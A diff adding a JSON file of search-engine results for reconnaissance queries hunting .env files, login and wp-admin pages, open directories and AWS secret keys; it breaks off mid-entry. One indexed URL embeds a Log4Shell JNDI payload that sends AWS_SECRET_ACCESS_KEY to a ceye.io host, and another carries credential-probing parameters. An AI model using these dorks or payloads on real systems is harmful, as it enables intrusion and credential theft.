@@ -1,0 +1,487 @@
+{
+    "filetype:.env": [],
+    "inurl:login": [
+        {
+            "position": 1,
+            "title": "Login.gov: The public's one account for government.",
+            "link": "https://www.login.gov/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.login.gov/&ved=2ahUKEwjz3vnjkteMAxWkmYkEHR3rFsAQFnoECCMQAQ",
+            "displayed_link": "https://www.login.gov",
+            "favicon": "https://serpapi.com/searches/67fcccd42aaae7067d81619b/images/6d9f3e95a8c9b8299baa7f6d8469a3bcd3782444c466ad6e06c2e1a3b1abcfa9.png",
+            "snippet": "Use one account and password for secure, private access to participating government agencies.",
+            "sitelinks": {
+                "expanded": [
+                    {
+                        "title": "Login",
+                        "link": "https://secure.login.gov/",
+                        "snippet": "A .gov website belongs to an official government organization ..."
+                    },
+                    {
+                        "title": "Create an account",
+                        "link": "https://www.login.gov/create-an-account/",
+                        "snippet": "Join the millions of people who trust Login.gov for safe, secure ..."
+                    },
+                    {
+                        "title": "Account",
+                        "link": "https://www.login.gov/what-is-login/",
+                        "snippet": "Login.gov is used to secure your account when you access ..."
+                    },
+                    {
+                        "title": "How can we help?",
+                        "link": "https://www.login.gov/help/",
+                        "snippet": "Trouble signing in? - Overview - Manage your account - ..."
+                    },
+                    {
+                        "title": "Create an account for new users",
+                        "link": "https://secure.login.gov/sign_up/enter_email",
+                        "snippet": "Create an account for new users. Enter your email address ..."
+                    }
+                ]
+            },
+            "source": "Login.gov"
+        },
+        {
+            "position": 2,
+            "title": "Google Accounts: Sign in",
+            "link": "https://accounts.google.co.in/login",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://accounts.google.co.in/login&ved=2ahUKEwjz3vnjkteMAxWkmYkEHR3rFsAQFnoECBMQAQ",
+            "displayed_link": "https://accounts.google.co.in \u203a login",
+            "favicon": "https://serpapi.com/searches/67fcccd42aaae7067d81619b/images/6d9f3e95a8c9b8299baa7f6d8469a3bc07cebba845ed4b262fba6e8cf497e658.png",
+            "snippet": "Sign in \u00b7 For my personal use \u00b7 For work or my business.",
+            "snippet_highlighted_words": [
+                "Sign in"
+            ],
+            "source": "google.co.in"
+        },
+        {
+            "position": 3,
+            "title": "Login | Salesforce",
+            "link": "https://login.salesforce.com/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://login.salesforce.com/&ved=2ahUKEwjz3vnjkteMAxWkmYkEHR3rFsAQFnoECBYQAQ",
+            "displayed_link": "https://login.salesforce.com",
+            "favicon": "https://serpapi.com/searches/67fcccd42aaae7067d81619b/images/6d9f3e95a8c9b8299baa7f6d8469a3bcf496b82e026dab9566305748e9dd630e.png",
+            "snippet": "Salesforce Customer Secure Login Page. Login to your Salesforce Customer Account.",
+            "snippet_highlighted_words": [
+                "Salesforce Customer Secure Login Page"
+            ],
+            "source": "Salesforce"
+        },
+        {
+            "position": 4,
+            "title": "Login",
+            "link": "https://www.clientam.com/sso/Login?partnerID=lynxbroker_mig",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.clientam.com/sso/Login%3FpartnerID%3Dlynxbroker_mig&ved=2ahUKEwjz3vnjkteMAxWkmYkEHR3rFsAQFnoECBUQAQ",
+            "displayed_link": "https://www.clientam.com \u203a sso \u203a Login",
+            "favicon": "https://serpapi.com/searches/67fcccd42aaae7067d81619b/images/6d9f3e95a8c9b8299baa7f6d8469a3bcce2a0c86b2fda5fe92b91cd42a64aa17.png",
+            "snippet": "Live Paper. Login. Username. Password. Need help? Help. Login. Select Second Factor Device. Select Type. Use your security code card for authentication.",
+            "source": "Handy Trader"
+        },
+        {
+            "position": 5,
+            "title": "Login",
+            "link": "https://en.wikipedia.org/wiki/Login",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://en.wikipedia.org/wiki/Login&ved=2ahUKEwjz3vnjkteMAxWkmYkEHR3rFsAQFnoECBcQAQ",
+            "displayed_link": "https://en.wikipedia.org \u203a wiki \u203a Login",
+            "favicon": "https://serpapi.com/searches/67fcccd42aaae7067d81619b/images/6d9f3e95a8c9b8299baa7f6d8469a3bc800b4bd0215bb334cd382c1878f3529d.png",
+            "snippet": "Logging in (or logging on, signing in, or signing on) is the process by which an individual gains access to a computer system or program",
+            "snippet_highlighted_words": [
+                "Logging in"
+            ],
+            "source": "Wikipedia"
+        },
+        {
+            "position": 6,
+            "title": "login: Enters a New Phase of Its Evolution",
+            "link": "https://www.usenix.org/publications/login",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.usenix.org/publications/login&ved=2ahUKEwjz3vnjkteMAxWkmYkEHR3rFsAQFnoECBIQAQ",
+            "displayed_link": "https://www.usenix.org \u203a publications \u203a login",
+            "favicon": "https://serpapi.com/searches/67fcccd42aaae7067d81619b/images/6d9f3e95a8c9b8299baa7f6d8469a3bcf6abfa7756bb9dc7615ae00972622dcb.png",
+            "snippet": "For over 20 years, ;login: has been a print magazine with a digital version; in the two decades previous, it was USENIX's newsletter, UNIX News. Since its ...",
+            "snippet_highlighted_words": [
+                "has been a print magazine with a digital version"
+            ],
+            "source": "USENIX"
+        },
+        {
+            "position": 7,
+            "title": "Log in to Fidelity",
+            "link": "https://digital.fidelity.com/prgw/digital/login/full-page",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://digital.fidelity.com/prgw/digital/login/full-page&ved=2ahUKEwjz3vnjkteMAxWkmYkEHR3rFsAQFnoECEgQAQ",
+            "displayed_link": "https://digital.fidelity.com \u203a digital \u203a login \u203a full-page",
+            "favicon": "https://serpapi.com/searches/67fcccd42aaae7067d81619b/images/6d9f3e95a8c9b8299baa7f6d8469a3bcfc3afcede16265de1516f109e2977cf6.png",
+            "snippet": "Log in Username Password Remember my username Log in Forgot username or password? New to Fidelity? Open an account or sign up.",
+            "snippet_highlighted_words": [
+                "Log in"
+            ],
+            "source": "Fidelity"
+        }
+    ],
+    "inurl:wp-admin": [
+        {
+            "position": 1,
+            "title": "Log In With WP-Admin | Learn WordPress",
+            "link": "https://learn.wordpress.org/lesson/how-to-log-in-with-wp-admin/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://learn.wordpress.org/lesson/how-to-log-in-with-wp-admin/&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECBYQAQ",
+            "displayed_link": "https://learn.wordpress.org \u203a lesson \u203a how-to-log-in-wit...",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8fae986848ca5a546ef72fcc9cbd04f269.png",
+            "snippet": "Please register or sign in to access the course content. Take course \u00b7 Sign in. Suggestions. Found a typo, grammar error or outdated screenshot?",
+            "snippet_highlighted_words": [
+                "Please register or sign in"
+            ],
+            "source": "Learn WordPress"
+        },
+        {
+            "position": 2,
+            "title": "WP Admin",
+            "link": "https://wordpress.com/wp-admin/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://wordpress.com/wp-admin/&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECBQQAQ",
+            "displayed_link": "https://wordpress.com \u203a wp-admin",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8fb1ed1b0ddfc77991a6a95874e5441dfa.png",
+            "snippet": "No information is available for this page.",
+            "source": "WordPress.com"
+        },
+        {
+            "position": 3,
+            "title": "12 Reasons Why You Can't Access Wp-admin With Easy ...",
+            "link": "https://blogvault.net/cant-access-wp-admin/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://blogvault.net/cant-access-wp-admin/&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECBcQAQ",
+            "displayed_link": "https://blogvault.net \u203a cant-access-wp-admin",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8fb9d20837e4c0bae9f0944e715c455781.png",
+            "date": "Dec 24, 2024",
+            "snippet": "If you're having trouble getting into wp-admin, start by checking your login details, your browser settings, or any conflicts with plugins.",
+            "source": "BlogVault"
+        },
+        {
+            "position": 4,
+            "title": "How to access WP Admin Dashboard - Hosting Support",
+            "link": "https://forum.infinityfree.com/t/how-to-access-wp-admin-dashboard/101788",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://forum.infinityfree.com/t/how-to-access-wp-admin-dashboard/101788&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECBgQAQ",
+            "displayed_link": "https://forum.infinityfree.com \u203a how-to-access-wp-admi...",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8f17b42ac06514da6215e0f4e8af1e2ee5.png",
+            "date": "Nov 18, 2024",
+            "snippet": "I have a blog theme that I edit and install on my WordPress sites, I know what to do from the dashboard, but I have no clue how to get to the WP Dashboard here.",
+            "snippet_highlighted_words": [
+                "how to get to the WP Dashboard"
+            ],
+            "source": "InfinityFree Forum"
+        },
+        {
+            "position": 5,
+            "title": "access wp-admin on localhost",
+            "link": "https://wordpress.org/support/topic/access-wp-admin-on-localhost/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://wordpress.org/support/topic/access-wp-admin-on-localhost/&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECB0QAQ",
+            "displayed_link": "https://wordpress.org \u203a support \u203a topic \u203a access-wp-ad...",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8f12e6cbf6c974eb352576299ce3fe796a.png",
+            "date": "Jan 13, 2023",
+            "snippet": "I'm duplicating a site on localhost for development purposes. Whenever I try to access wp-admin it takes me to the live site. Where in the files is the link ...",
+            "sitelinks": {
+                "list": [
+                    {
+                        "title": "Can't access wp-admin.php | WordPress.org",
+                        "link": "https://wordpress.org/support/topic/cant-access-wp-admin-php-2/",
+                        "date": "Nov 9, 2024"
+                    },
+                    {
+                        "title": "cannot access wp-admin anymore | WordPress.org",
+                        "link": "https://wordpress.org/support/topic/cannot-access-wp-admin-anymore-2/",
+                        "date": "Oct 11, 2022"
+                    }
+                ]
+            },
+            "source": "WordPress.org"
+        },
+        {
+            "position": 6,
+            "title": "Log in to WP Admin from Local app - Support",
+            "link": "https://community.localwp.com/t/log-in-to-wp-admin-from-local-app/43266",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://community.localwp.com/t/log-in-to-wp-admin-from-local-app/43266&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECBsQAQ",
+            "displayed_link": "https://community.localwp.com \u203a log-in-to-wp-admin-f...",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8fef2f2cafffe6e9319f6a97b68e5c326a.png",
+            "date": "Jun 11, 2024",
+            "snippet": "Go to the Local sites tab and then click on the \u201cWP Admin\u201d. This opens a link that asks me to enter my username and password for WordPress.",
+            "source": "localwp.com"
+        },
+        {
+            "position": 7,
+            "title": "Can't Access wp-admin? 12 Reasons Behind This Error ...",
+            "link": "https://www.malcare.com/blog/cant-access-wp-admin/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.malcare.com/blog/cant-access-wp-admin/&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECBkQAQ",
+            "displayed_link": "https://www.malcare.com \u203a blog \u203a cant-access-wp-admin",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8f2d5f556e642e6ab1feea733910f24cea.png",
+            "date": "Dec 24, 2024",
+            "snippet": "If you can't access wp-admin, check for incorrect login details, browser settings, or plugin conflicts. File permissions and memory limits can also be culprits.",
+            "snippet_highlighted_words": [
+                "incorrect login details, browser settings, or plugin conflicts"
+            ],
+            "source": "MalCare"
+        },
+        {
+            "position": 8,
+            "title": "WP Admin Cleaner",
+            "link": "https://dplugins.com/downloads/wp-admin-cleaner/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://dplugins.com/downloads/wp-admin-cleaner/&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECDMQAQ",
+            "displayed_link": "https://dplugins.com \u203a downloads \u203a wp-admin-cleaner",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8f9aad89262a64b9fb7a573ee61a4fced4.png",
+            "snippet": "WP Admin cleaner is a small but powerful plugin that you should have in your toolset. It is easy to use and quick to set up.",
+            "snippet_highlighted_words": [
+                "WP Admin cleaner"
+            ],
+            "rich_snippet": {
+                "bottom": {
+                    "detected_extensions": {
+                        "price_from": 59.0,
+                        "price_to": 129.0,
+                        "currency": "$"
+                    },
+                    "extensions": [
+                        "$59.00 to $129.00"
+                    ]
+                }
+            },
+            "source": "dplugins.com"
+        },
+        {
+            "position": 9,
+            "title": "Please Stop Hiding wp-admin",
+            "link": "https://chriswiegman.com/2021/10/please-stop-hiding-wp-admin/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://chriswiegman.com/2021/10/please-stop-hiding-wp-admin/&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECC4QAQ",
+            "displayed_link": "https://chriswiegman.com \u203a 2021/10 \u203a please-stop-hidin...",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8f1f30001b94104fae69553dde4adeed90.png",
+            "date": "Oct 13, 2021",
+            "snippet": "Stop hiding wp-admin and start updating your site while using a solid host. Not only will your security be much improved but you'll have far fewer problems.",
+            "source": "Chris Wiegman"
+        },
+        {
+            "position": 10,
+            "title": "Can't Access a Wp-Admin Page and Log In to WordPress ...",
+            "link": "https://crocoblock.com/knowledge-base/troubleshooting/cant-access-a-wp-admin-page/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://crocoblock.com/knowledge-base/troubleshooting/cant-access-a-wp-admin-page/&ved=2ahUKEwiklrrlkteMAxXFRTABHZ-fJFEQFnoECCwQAQ",
+            "displayed_link": "https://crocoblock.com \u203a Home \u203a Troubleshooting",
+            "favicon": "https://serpapi.com/searches/67fcccd6d1b9170448a8ac28/images/03482357c102b77fc77512ae10ddfb8f143f1c7e8631aed1031f63214d7e5ce2.png",
+            "date": "Jan 24, 2024",
+            "snippet": "Learn what to do if you can't access the wp-admin page and have problems logging in to the admin panel of your WordPress website.",
+            "snippet_highlighted_words": [
+                "Learn what to do if you can't access the wp-admin page"
+            ],
+            "source": "Crocoblock"
+        }
+    ],
+    "intitle:index of": [
+        {
+            "position": 1,
+            "title": "Index of /",
+            "link": "https://docs.oasis-open.org/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://docs.oasis-open.org/&ved=2ahUKEwjI1I7mkteMAxU_M1kFHU3jFBoQFnoECBkQAQ",
+            "displayed_link": "https://docs.oasis-open.org",
+            "snippet": "Index of / ; biometrics/, 22-Sep-2014 19:08, - ; bioserv/, 17-Oct-2016 17:53, - ; bpel4people/, 07-Feb-2013 15:07, - ; business-transaction/, 29-Apr-2005 18:05, -.",
+            "snippet_highlighted_words": [
+                "Index of"
+            ],
+            "source": "OASIS Open"
+        },
+        {
+            "position": 2,
+            "title": "index(of:) | Apple Developer Documentation",
+            "link": "https://developer.apple.com/documentation/swift/array/index(of:)",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://developer.apple.com/documentation/swift/array/index(of:)&ved=2ahUKEwjI1I7mkteMAxU_M1kFHU3jFBoQFnoECEoQAQ",
+            "displayed_link": "https://developer.apple.com \u203a swift \u203a array \u203a index(of:)",
+            "favicon": "https://serpapi.com/searches/67fcccd96f4dd1b4ec6fa6d2/images/cdbd3d094b8dce88002929c4fbf014f2cf4a51bd1c9b4774afc15bf22e62fdfa.png",
+            "snippet": "Returns the first index where the specified value appears in the collection.",
+            "source": "Apple Developer"
+        },
+        {
+            "position": 3,
+            "title": "Are \"Index of\" search results diminishing? : r/opendirectories",
+            "link": "https://www.reddit.com/r/opendirectories/comments/mml8u9/are_index_of_search_results_diminishing/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.reddit.com/r/opendirectories/comments/mml8u9/are_index_of_search_results_diminishing/&ved=2ahUKEwjI1I7mkteMAxU_M1kFHU3jFBoQFnoECGEQAQ",
+            "displayed_link": "60+ comments \u00b7 4 years ago",
+            "favicon": "https://serpapi.com/searches/67fcccd96f4dd1b4ec6fa6d2/images/cdbd3d094b8dce88002929c4fbf014f23736ce9ad267356329dd1ddb2cdb3314.png",
+            "snippet": "I used to get any TV series I wanted with \"Index of/series\" but lately those sites seem to be dwindling and the usual sites are are not ...",
+            "sitelinks": {
+                "list": [
+                    {
+                        "title": "I keep seeing intitle:\"index.of and other commands ...",
+                        "link": "https://www.reddit.com/r/opendirectories/comments/nypng6/i_keep_seeing_intitleindexof_and_other_commands/",
+                        "answer_count": 21,
+                        "date": "Jun 13, 2021"
+                    },
+                    {
+                        "title": "How to get index of array element? : r/godot - Reddit",
+                        "link": "https://www.reddit.com/r/godot/comments/1cxx5e7/how_to_get_index_of_array_element/",
+                        "answer_count": 8,
+                        "date": "May 22, 2024"
+                    }
+                ]
+            },
+            "source": "Reddit \u00b7 r/opendirectories"
+        },
+        {
+            "position": 4,
+            "title": "index(of:) | Apple Developer Documentation",
+            "link": "https://developer.apple.com/documentation/realitykit/entity/childcollection/index(of:)?changes=_3",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://developer.apple.com/documentation/realitykit/entity/childcollection/index(of:)%3Fchanges%3D_3&ved=2ahUKEwjI1I7mkteMAxU_M1kFHU3jFBoQFnoECE8QAQ",
+            "displayed_link": "https://developer.apple.com \u203a entity \u203a childcollection \u203a i...",
+            "favicon": "https://serpapi.com/searches/67fcccd96f4dd1b4ec6fa6d2/images/cdbd3d094b8dce88002929c4fbf014f24f367db3697e760c2d1fceb458e70dfc.png",
+            "snippet": "Returns the first index where the specified value appears in the collection.",
+            "source": "Apple Developer"
+        },
+        {
+            "position": 5,
+            "title": "Index of /",
+            "link": "http://ftp.xemacs.org/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=http://ftp.xemacs.org/&ved=2ahUKEwjI1I7mkteMAxU_M1kFHU3jFBoQFnoECE0QAQ",
+            "displayed_link": "http://ftp.xemacs.org",
+            "snippet": "Index of / .cshrc .history .login .login_conf .mail_aliases .mailrc .profile .rhosts .shrc \u00b7 pub/",
+            "snippet_highlighted_words": [
+                "Index of"
+            ],
+            "source": "XEmacs"
+        },
+        {
+            "position": 6,
+            "title": "Python List index() Method",
+            "link": "https://www.w3schools.com/python/ref_list_index.asp",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.w3schools.com/python/ref_list_index.asp&ved=2ahUKEwjI1I7mkteMAxU_M1kFHU3jFBoQFnoECE4QAQ",
+            "displayed_link": "https://www.w3schools.com \u203a python \u203a ref_list_index",
+            "favicon": "https://serpapi.com/searches/67fcccd96f4dd1b4ec6fa6d2/images/cdbd3d094b8dce88002929c4fbf014f242f329129761a1447df9a79befaa6d29.png",
+            "snippet": "The index() method returns the position at the first occurrence of the specified value. Syntax: list.index(elmnt)",
+            "snippet_highlighted_words": [
+                "returns the position at the first occurrence of the specified value"
+            ],
+            "source": "W3Schools"
+        },
+        {
+            "position": 7,
+            "title": "Question about index of \"=-1\" and \"<0\" - JavaScript",
+            "link": "https://forum.freecodecamp.org/t/question-about-index-of-1-and-0/505076",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://forum.freecodecamp.org/t/question-about-index-of-1-and-0/505076&ved=2ahUKEwjI1I7mkteMAxU_M1kFHU3jFBoQFnoECFEQAQ",
+            "displayed_link": "https://forum.freecodecamp.org \u203a question-about-index...",
+            "favicon": "https://serpapi.com/searches/67fcccd96f4dd1b4ec6fa6d2/images/cdbd3d094b8dce88002929c4fbf014f2a6ed506331785ac39976a2edbf7f9fec.png",
+            "date": "Apr 17, 2022",
+            "snippet": "Why can't I use \u201ctarget.indexOf(test[i] = -1)\u201d instead of \"<0\"as index of -1 means test element doesn't exist in target element?",
+            "source": "The freeCodeCamp Forum"
+        },
+        {
+            "position": 8,
+            "title": "Understanding Javascript for of with index",
+            "link": "https://daily.dev/blog/understanding-javascript-for-of-with-index",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://daily.dev/blog/understanding-javascript-for-of-with-index&ved=2ahUKEwjI1I7mkteMAxU_M1kFHU3jFBoQFnoECEkQAQ",
+            "displayed_link": "https://daily.dev \u203a Blog \u203a Get into tech",
+            "favicon": "https://serpapi.com/searches/67fcccd96f4dd1b4ec6fa6d2/images/cdbd3d094b8dce88002929c4fbf014f233edac89bc4cf866c405eb018ff78ca5.png",
+            "date": "Mar 10, 2024",
+            "snippet": "The indexOf() method in JavaScript is a way to find out where a certain piece of text starts within a bigger text. For instance, if you want to ...",
+            "source": "Daily.dev"
+        }
+    ],
+    "inurl:AWS_SECRET_ACCESS_KEY": [
+        {
+            "position": 1,
+            "title": "Terraform Registry",
+            "link": "https://registry.terraform.io/providers/defreng/vaultsecure/latest/docs/resources/aws_secret_access_key",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://registry.terraform.io/providers/defreng/vaultsecure/latest/docs/resources/aws_secret_access_key&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECBwQAQ",
+            "displayed_link": "https://registry.terraform.io \u203a aws_secret_access_key",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed5942302e90ae19872aa199bfa666f9eac46.png",
+            "source": "Terraform Registry"
+        },
+        {
+            "position": 2,
+            "title": "Akeyless::AWSTargetDetails#aws_secret_access_key",
+            "link": "https://rubydoc.info/gems/akeyless/3.5.3/Akeyless%2FAWSTargetDetails:aws_secret_access_key",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://rubydoc.info/gems/akeyless/3.5.3/Akeyless%252FAWSTargetDetails:aws_secret_access_key&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECB4QAQ",
+            "displayed_link": "https://rubydoc.info \u203a gems \u203a AWSTargetDetails:aws_s...",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed594bc08a8c31c3d01d44ed04311e63af165.png",
+            "snippet": "Returns the value of attribute aws_secret_access_key. [View source]. 22 23 24, # File 'lib/akeyless/models/aws_target_details.",
+            "snippet_highlighted_words": [
+                "aws_secret_access_key"
+            ],
+            "source": "RubyDoc.info"
+        },
+        {
+            "position": 3,
+            "title": "Partial credentials found in env, missing - A Passionate Techie",
+            "link": "https://apassionatechie.wordpress.com/2018/02/14/partial-credentials-found-in-env-missing-aws_secret_access_key/",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://apassionatechie.wordpress.com/2018/02/14/partial-credentials-found-in-env-missing-aws_secret_access_key/&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECB8QAQ",
+            "displayed_link": "https://apassionatechie.wordpress.com \u203a 2018/02/14 \u203a p...",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed59461960f11f40330d48f41893477255b95.png",
+            "date": "Feb 14, 2018",
+            "snippet": "Just configured the AWS CLI on my computer with my AWS Access and Secret Key. When I try to use the AWS CLI though it gives me this error.",
+            "snippet_highlighted_words": [
+                "Just configured the AWS CLI on my computer with my AWS Access and Secret Key"
+            ],
+            "source": "WordPress.com"
+        },
+        {
+            "position": 4,
+            "title": "django.conf.settings.AWS_SECRET_ACCESS_KEY",
+            "link": "https://www.programcreek.com/python/example/100226/django.conf.settings.AWS_SECRET_ACCESS_KEY",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.programcreek.com/python/example/100226/django.conf.settings.AWS_SECRET_ACCESS_KEY&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECCAQAQ",
+            "displayed_link": "https://www.programcreek.com \u203a python \u203a example \u203a dj...",
+            "snippet": "This page shows Python examples of django.conf.settings.AWS_SECRET_ACCESS_KEY.",
+            "snippet_highlighted_words": [
+                "django.conf.settings.AWS_SECRET_ACCESS_KEY"
+            ],
+            "source": "Program Creek"
+        },
+        {
+            "position": 5,
+            "title": "https://carbon.now.sh/?bg=rgba(255,255,255,1)&t=se...",
+            "link": "https://carbon.now.sh/?bg=rgba(255,255,255,1)&t=seti&l=javascript&ds=true&wc=true&wa=true&pv=48px&ph=32px&ln=false&code=const%20s3%20%3D%20new%20AWS.S3(%7B%0A%20%20%20%20accessKeyId%3A%20process.env.AWS_ACCESS_KEY%2C%0A%20%20%20%20secretAccessKey%3A%20process.env.AWS_SECRET_ACCESS_KEY%0A%7D)%3B",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://carbon.now.sh/%3Fbg%3Drgba(255,255,255,1)%26t%3Dseti%26l%3Djavascript%26ds%3Dtrue%26wc%3Dtrue%26wa%3Dtrue%26pv%3D48px%26ph%3D32px%26ln%3Dfalse%26code%3Dconst%2520s3%2520%253D%2520new%2520AWS.S3(%257B%250A%2520%2520%2520%2520accessKeyId%253A%2520process.env.AWS_ACCESS_KEY%252C%250A%2520%2520%2520%2520secretAccessKey%253A%2520process.env.AWS_SECRET_ACCESS_KEY%250A%257D)%253B&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECCQQAQ",
+            "displayed_link": "https://carbon.now.sh \u203a code=const s3 = new AWS.S3({...",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed5940def7978c50241594099ff168a6e22ba.png",
+            "snippet": "No information is available for this page.",
+            "source": "Carbon.sh"
+        },
+        {
+            "position": 6,
+            "title": "Kezd\u0151lap - B\u00e1cs-Kiskun V\u00e1rmegyei Kereskedelmi \u00e9s ...",
+            "link": "https://www.bkmkik.hu/hu/?amp;cookie_069f88e9145f7cfdea92831ca478c804=accepted&x=$%7Bjndi:ldap:/36.$%7Benv:AWS_SECRET_ACCESS_KEY%7D.2srsjk.ceye.io/a%7D",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.bkmkik.hu/hu/%3Famp%3Bcookie_069f88e9145f7cfdea92831ca478c804%3Daccepted%26x%3D%24%257Bjndi:ldap:/36.%24%257Benv:AWS_SECRET_ACCESS_KEY%257D.2srsjk.ceye.io/a%257D&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECCEQAQ",
+            "displayed_link": "https://www.bkmkik.hu \u203a 36.${en...",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed59414774041363a8bb4c75364992457ccee.png",
+            "snippet": "B\u00e1cs-Kiskun Megyei Kereskedelmi \u00e9s Iparkamara hivatalos oldala - Kezd\u0151lap.",
+            "source": "B\u00e1cs-Kiskun V\u00e1rmegyei Kereskedelmi \u00e9s Iparkamara"
+        },
+        {
+            "position": 7,
+            "title": "Oznamy | Trnavsk\u00e1 univerzita v Trnave",
+            "link": "https://www.truni.sk/oznamy?ConsumerKey=m0643&DB_USERNAME=zqp21&SLACK_BOT_TOKEN=cv43j1%5Cqqq&a=aor22&access_token=yk7d8&admin=mzts1&aws_secret_access_key=jyii2&b_5d79329c92604e9a9e7fa9b98_58a3f3a0e6=q54b7&bucket=gsx53&cat=qeyn2&client_secret=zqoe4&clientsecret=cd851&consumer_key=lhy78&email=bv408&lang=kau69&name=uai90&ssh-key=s7yw7&sshkey=g9um0&type=uw2r3&y=i0p04&page=47",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.truni.sk/oznamy%3FConsumerKey%3Dm0643%26DB_USERNAME%3Dzqp21%26SLACK_BOT_TOKEN%3Dcv43j1%255Cqqq%26a%3Daor22%26access_token%3Dyk7d8%26admin%3Dmzts1%26aws_secret_access_key%3Djyii2%26b_5d79329c92604e9a9e7fa9b98_58a3f3a0e6%3Dq54b7%26bucket%3Dgsx53%26cat%3Dqeyn2%26client_secret%3Dzqoe4%26clientsecret%3Dcd851%26consumer_key%3Dlhy78%26email%3Dbv408%26lang%3Dkau69%26name%3Duai90%26ssh-key%3Ds7yw7%26sshkey%3Dg9um0%26type%3Duw2r3%26y%3Di0p04%26page%3D47&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECB0QAQ",
+            "displayed_link": "https://www.truni.sk \u203a oznamy \u203a a...",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed5948a831678762d10b110d0857c9f16e07d.png",
